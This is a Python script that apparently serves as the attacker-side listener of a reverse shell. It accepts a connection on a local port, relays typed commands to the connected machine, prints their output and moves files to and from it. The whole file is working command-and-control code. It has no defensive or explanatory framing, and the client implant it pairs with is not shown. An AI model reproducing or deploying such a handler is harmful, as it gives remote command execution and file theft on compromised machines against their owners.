# modules

import socket
import os

# definitions


def download(file):
    with open(file, 'wb') as f:
        while True:
            chunk = client.recv(1024)
            if not chunk:
                break
            f.write(chunk)


def upload(file):
    with open(file, 'rb') as f:
        while True:
            chunk = f.read(1024)
            if not chunk:
                break
            client.sendall(chunk)


# main program

host = '127.0.0.1'
port = 8080

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(1)
print('\033[1;37m[-]\033[m listening on', port, '...')

client, addr = server.accept()
print('\n\033[1;32m[+]\033[m connected to', addr)
print()
while True:
    comm = input(f'\033[1m{addr}\033[m\n\033[0;32m>\033[m ')
    if comm == 'close':
        client.send(comm.encode())
        break
    elif comm[:3] == 'cd ':
        client.send(comm.encode())
    elif comm == 'clean':
        os.system(comm)
    elif comm[:7] == 'upload ':
        upload(comm[7:])
    elif comm[:9] == 'download ':
        download(comm[9:])
    elif comm.strip() == '':
        pass
    else:
        client.send(comm.encode())
        output = client.recv(1024).decode()
        print(output)

server.close()
